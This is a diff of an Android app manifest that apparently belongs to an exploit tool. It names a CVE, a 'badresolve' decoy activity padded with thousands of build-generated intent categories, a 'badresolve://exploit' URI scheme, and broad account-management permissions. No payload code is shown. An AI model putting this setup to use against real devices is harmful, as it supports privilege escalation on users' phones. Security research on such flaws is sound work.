@@ -3,6 +3,11 @@
     xmlns:tools="http://schemas.android.com/tools"
     android:sharedUserId="roro.stellar.manager"
     tools:ignore="MissingLeanbackLauncher">
+    
+    <!-- Account 管理权限 -->
+    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
+    <uses-permission android:name="android.permission.MANAGE_ACCOUNTS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
 
 	<!-- 查询所有已安装应用（Android 11+ 需要） -->
 	<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
@@ -98,32 +103,34 @@
             </intent-filter>
         </activity>
         
-        <!-- 诱饵 Activity - 需要 5000+ categories（由构建脚本生成） -->
+        <!-- 诱饵 Activity - categories由构建脚本生成 -->
 		<activity 
 		    android:name="com.cfks.badresolve.DecoyActivity"
-		    android:exported="true">
+		    android:exported="true"
+		    android:excludeFromRecents="true">
 		    
 		    <intent-filter android:priority="1000">
 		        <action android:name="android.intent.action.VIEW" />
 		        <category android:name="android.intent.category.DEFAULT" />
 		        <category android:name="android.intent.category.BROWSABLE" />
 		        
-		        <!-- 声明自定义 scheme -->
 		        <data android:scheme="badresolve" 
-		        	android:host="setup"
-		        	android:pathPattern=".*" />
+		              android:host="setup"
+		              android:pathPattern=".*" />
+		        <data android:scheme="badresolve" 
+		              android:host="exploit"
+		              android:pathPattern=".*" />
 		        
-		        <!-- 5000+ categories 会在构建时自动生成到此位置 -->
+		        <!-- 5000+ categories 由构建脚本生成到此位置 -->
 		        <!-- ${GENERATED_CATEGORIES} -->
 		        
 		    </intent-filter>
 		    
-		    <!-- 第二个 intent-filter 用于处理普通 VIEW intent -->
+		    <!-- 备用intent-filter -->
 		    <intent-filter>
 		        <action android:name="android.intent.action.VIEW" />
 		        <category android:name="android.intent.category.DEFAULT" />
-		        <data android:scheme="badresolve"
-		        	android:host="*" />
+		        <data android:scheme="badresolve" android:host="*" />
 		    </intent-filter>
 		</activity>
         
@@ -142,6 +149,11 @@
                 android:resource="@xml/authenticator"/>
 
         </service>
+        
+        <!-- 可选：监听首选设置完成的广播 -->
+        <receiver
+            android:name="com.cfks.badresolve.DecoyActivity$PreferredReceiver"
+            android:exported="false" />
         
         <receiver android:name="com.cfks.cve202431317.ShizukuProtectReceiver"
 			android:enabled="true"
